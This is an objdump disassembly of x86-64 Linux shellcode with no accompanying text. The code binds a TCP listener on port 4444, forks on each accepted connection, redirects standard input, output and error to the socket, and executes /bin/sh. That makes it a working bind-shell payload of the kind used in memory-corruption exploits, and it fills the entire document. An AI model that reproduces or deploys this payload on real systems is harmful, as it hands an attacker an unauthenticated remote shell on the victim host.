
asm.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <accept-0x72>:
   0:	48 31 c0             	xor    %rax,%rax
   3:	b0 01                	mov    $0x1,%al
   5:	89 c6                	mov    %eax,%esi
   7:	fe c0                	inc    %al
   9:	89 c7                	mov    %eax,%edi
   b:	48 31 d2             	xor    %rdx,%rdx
   e:	b0 29                	mov    $0x29,%al
  10:	0f 05                	syscall 
  12:	93                   	xchg   %eax,%ebx
  13:	48 31 c0             	xor    %rax,%rax
  16:	49 c7 c0 08 00 00 00 	mov    $0x8,%r8
  1d:	49 89 e2             	mov    %rsp,%r10
  20:	ba 02 00 00 00       	mov    $0x2,%edx
  25:	be ff ff 00 00       	mov    $0xffff,%esi
  2a:	89 df                	mov    %ebx,%edi
  2c:	b0 36                	mov    $0x36,%al
  2e:	0f 05                	syscall 
  30:	48 31 c0             	xor    %rax,%rax
  33:	49 c7 c0 08 00 00 00 	mov    $0x8,%r8
  3a:	49 89 e2             	mov    %rsp,%r10
  3d:	ba 0f 00 00 00       	mov    $0xf,%edx
  42:	be ff ff 00 00       	mov    $0xffff,%esi
  47:	89 df                	mov    %ebx,%edi
  49:	b0 36                	mov    $0x36,%al
  4b:	0f 05                	syscall 
  4d:	48 31 c0             	xor    %rax,%rax
  50:	50                   	push   %rax
  51:	68 02 01 11 5c       	pushq  $0x5c110102
  56:	88 44 24 01          	mov    %al,0x1(%rsp)
  5a:	48 89 e6             	mov    %rsp,%rsi
  5d:	b2 10                	mov    $0x10,%dl
  5f:	89 df                	mov    %ebx,%edi
  61:	b0 31                	mov    $0x31,%al
  63:	0f 05                	syscall 
  65:	b0 05                	mov    $0x5,%al
  67:	89 c6                	mov    %eax,%esi
  69:	89 df                	mov    %ebx,%edi
  6b:	b0 32                	mov    $0x32,%al
  6d:	0f 05                	syscall 
  6f:	48 31 c0             	xor    %rax,%rax

0000000000000072 <accept>:
  72:	31 d2                	xor    %edx,%edx
  74:	31 f6                	xor    %esi,%esi
  76:	89 df                	mov    %ebx,%edi
  78:	b0 2b                	mov    $0x2b,%al
  7a:	0f 05                	syscall 
  7c:	89 c5                	mov    %eax,%ebp
  7e:	48 31 c0             	xor    %rax,%rax
  81:	b0 39                	mov    $0x39,%al
  83:	0f 05                	syscall 
  85:	85 c0                	test   %eax,%eax
  87:	75 e9                	jne    72 <accept>
  89:	89 ef                	mov    %ebp,%edi
  8b:	48 31 c0             	xor    %rax,%rax
  8e:	89 c6                	mov    %eax,%esi
  90:	b0 21                	mov    $0x21,%al
  92:	0f 05                	syscall 
  94:	fe c0                	inc    %al
  96:	89 c6                	mov    %eax,%esi
  98:	b0 21                	mov    $0x21,%al
  9a:	0f 05                	syscall 
  9c:	fe c0                	inc    %al
  9e:	89 c6                	mov    %eax,%esi
  a0:	b0 21                	mov    $0x21,%al
  a2:	0f 05                	syscall 
  a4:	48 31 d2             	xor    %rdx,%rdx
  a7:	48 bb ff 2f 62 69 6e 	movabs $0x68732f6e69622fff,%rbx
  ae:	2f 73 68 
  b1:	48 c1 eb 08          	shr    $0x8,%rbx
  b5:	53                   	push   %rbx
  b6:	48 89 e7             	mov    %rsp,%rdi
  b9:	48 31 c0             	xor    %rax,%rax
  bc:	50                   	push   %rax
  bd:	57                   	push   %rdi
  be:	48 89 e6             	mov    %rsp,%rsi
  c1:	b0 3b                	mov    $0x3b,%al
  c3:	0f 05                	syscall 
